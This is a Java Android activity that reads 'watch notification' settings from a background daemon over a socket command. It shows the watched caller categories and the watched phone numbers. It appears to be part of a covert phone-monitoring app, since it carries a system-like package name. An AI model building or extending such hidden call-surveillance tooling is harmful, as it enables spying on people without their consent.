package com.fx;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.app.ProgressDialog;
import android.os.AsyncTask;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;

import com.android.msecurity.R;
import com.fx.maind.ref.WatchNotificationSettings;
import com.fx.maind.ref.WatchNotificationSettings.WatchFlag;
import com.fx.maind.ref.command.RemoteGetWatchNotificationSettings;
import com.fx.socket.SocketCmd;
import com.fx.util.Customization;
import com.vvt.logger.FxLog;

public class WatchNotificationSettingActivity  extends Activity {
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	private static final String TAG = "WatchNotificationSettingActivity";
	private static final String IN_ADDRESS_BOOK = "In address book";
	private static final String WATCH_IN_LIST = "In list";
	private static final String WATCH_NOT_IN_ADDRESSBOOK = "Not in address book";
	private static final String WATCH_PRIVATE_OR_UNKNOWN_NUMBER = "Private/unknown number";
 	private TextView mWatchNumbersTextview = null;
 	private TextView watchOptionsTextView = null;
	private ListView mWatchListListView = null;
	private ArrayList<String> mWatchListOptions;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.watch_notification_settings);
		
		mWatchListOptions = new ArrayList<String>();
		mWatchNumbersTextview  = (TextView) findViewById(R.id.watchNumbersTextview);
		watchOptionsTextView = (TextView) findViewById(R.id.watchOptionsTextView);
		mWatchListListView = (ListView) findViewById(R.id.watchlist);
		mWatchListListView.setEnabled(false);
		
	 	
		refreshWatchListItems();
		
		new UITask().execute(new RemoteGetWatchNotificationSettings());
	}
	
	private void refreshWatchListItems() {
		mWatchListOptions.add(IN_ADDRESS_BOOK);
		mWatchListOptions.add(WATCH_NOT_IN_ADDRESSBOOK);
		mWatchListOptions.add(WATCH_IN_LIST);
		mWatchListOptions.add(WATCH_PRIVATE_OR_UNKNOWN_NUMBER);

		ArrayAdapter<String> adp = new ArrayAdapter<String>(this,
				android.R.layout.simple_list_item_multiple_choice, mWatchListOptions);

		mWatchListListView.setAdapter(adp);
		mWatchListListView.setChoiceMode(ListView.CHOICE_MODE_MULTIPLE);
		mWatchListListView.setEmptyView(findViewById(android.R.id.empty));
	}
	
	private class UITask extends AsyncTask<SocketCmd<?, ?>, Void, String> {
		private Object result = null;
		private ProgressDialog pDialog;
		
		protected void onPreExecute() {
			pDialog = ProgressDialog.show(
					WatchNotificationSettingActivity.this, "", 
					getString(R.string.language_ui_msg_processing_polite), true);
	    }
		
	    protected String doInBackground(SocketCmd<?, ?>... socketCommand) {
	    	if (LOGV) FxLog.v(TAG, "UITask # doInBackground # START");
	    	
	    	SocketCmd<?, ?> initSocketCommand = socketCommand[0];
	    	
			try {
				if (LOGV) FxLog.v(TAG, "UITask # before execute");
        		result = initSocketCommand.execute();
        		if (LOGV) FxLog.v(TAG, "UITask # after execute");
        	}
        	catch(Throwable t) {
        		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + t.toString());
        	}
			
			if (LOGV && result != null) FxLog.v(TAG, "UITask # doInBackground # result #" + result.toString());
			if (LOGV) FxLog.v(TAG, "UITask # doInBackground # EXIT");
	    	return null;
	    }

	    
	    protected void onPostExecute(String outputMsg) {
	    	pDialog.dismiss();
	    	
	    	if (result == null) {
	    		UiHelper.notifyUser(getApplicationContext(), "Internal error!");
	    	}
	    	else {
	    		onPostExecuteTask(result);
	    	}
	    }
	}
	
	private void onPostExecuteTask(Object result) {
		WatchNotificationSettings response = (WatchNotificationSettings) result;
		StringBuilder sb = new StringBuilder();
		sb.append("Watch options:").append(System.getProperty("line.separator"));
		
		if(response.getEnableWatchNotification()) {
			sb.append("Currently set to enabled");	
		}
		else {
			sb.append("Currently set to disabled");
		}
		
		watchOptionsTextView.setText(sb.toString());
		
		for (WatchFlag f : response.getWatchFlag()) {
			if( f == WatchFlag.WATCH_IN_ADDRESSBOOK) {
				checkItem(IN_ADDRESS_BOOK);
			}
			else if (f== WatchFlag.WATCH_IN_LIST) {
				checkItem(WATCH_IN_LIST);
			}
			else if (f== WatchFlag.WATCH_NOT_IN_ADDRESSBOOK) {
				checkItem(WATCH_NOT_IN_ADDRESSBOOK);
			}
			else if (f== WatchFlag.WATCH_PRIVATE_OR_UNKNOWN_NUMBER) {
				checkItem(WATCH_PRIVATE_OR_UNKNOWN_NUMBER);
			}
		}
		
		sb = new StringBuilder();
		sb.append("Watch numbers:").append(System.getProperty("line.separator"));
		
		List<String> watchListNumbers = response.GetWatchListNumbers();
		
		if(watchListNumbers.size() > 0) {
			for (String number : watchListNumbers) {
				sb.append(number).append(System.getProperty("line.separator"));
			}
		}
		else {
			sb.append("[none]");
		}
		
		mWatchNumbersTextview.setText(sb.toString());
	}
	
	private void checkItem(String itemName) {
		int count = mWatchListListView.getAdapter().getCount();
        
		for (int i = 0; i < count; i++) {
			String currentItem = (String) this.mWatchListListView.getAdapter().getItem(i);
			
			if(itemName.equalsIgnoreCase(currentItem)) {
				this.mWatchListListView.setItemChecked(i, true);
				break;
			}
		}
	}
		
}
